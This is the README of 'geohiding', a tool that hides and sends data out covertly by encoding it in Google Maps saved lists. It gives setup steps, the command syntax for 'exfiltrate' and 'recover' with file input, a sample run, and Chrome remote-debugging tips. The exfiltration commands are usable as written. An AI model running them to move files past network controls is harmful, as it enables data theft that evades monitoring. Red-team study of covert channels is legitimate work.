# geohiding
A tool that allows exfiltrating data through Google Maps lists

# Requirements

Google Chrome needs to be installed in the system (recommeded to be installed in the Default location) 

Python3, install python dependencies with:

```
pip install -r requirements.txt
```

A google account logged in (in the Chrome browser).

Also chromedriver should be downloaded and in path. See https://chromedriver.chromium.org/downloads to download the driver according to your browser version (this can be checked in chrome://version).

# Execution 

## Exfiltration

To exfiltrate data, execute the following command
```
python3 main.py exfiltrate (-m MESSAGE | -i INPUT) -p PASSPHRASE -n NAME -l LOCATION [-R RADIUS]
  -m MESSAGE, --message MESSAGE
                        The message to hide
  -i INPUT, --input INPUT
                        The input file
  -p PASSPHRASE, --passphrase PASSPHRASE
                        A passphrase should be provided
  -n NAME, --name NAME  The name of the list
  -l LOCATION, --location LOCATION
                        The location to search
  -R RADIUS, --radius RADIUS
                        The radius from the location (in kilometers), default: 50km
```

## Recovery

To recover the data, use the following command:
```
python3 main.py recover google_maps_link -p PASSPHRASE [-o OUTPUT] 
  google_maps_link      The Google Maps link
  -p PASSPHRASE, --passphrase PASSPHRASE
                        A passphrase should be provided
  -o OUTPUT, --output OUTPUT
                        The output file name
```

## Example

Exfiltration:
```
> python3 main.py exfiltrate -m "Lorem ipsum" -p aUserPassphrase -n "Google Maps List Name" -l Vaduz -R 20
... 
Link: https://goo.gl/maps/EDShhyhN4Tpc6Zsb7
```

Recovery:
```
> python3 main.py recover https://goo.gl/maps/EDShhyhN4Tpc6Zsb7 -p aUserPassphrase
...
Output:
Lorem ipsum
```

## Troubleshooting

The program might not find your Google Chrome browser, therefore a warning will be shown.

If this happens, execute chrome the following way:

Windows:
```
chrome.exe --remote-debugging-port=9222 
```

Linux:
```
google-chrome --remote-debugging-port=9222 
```
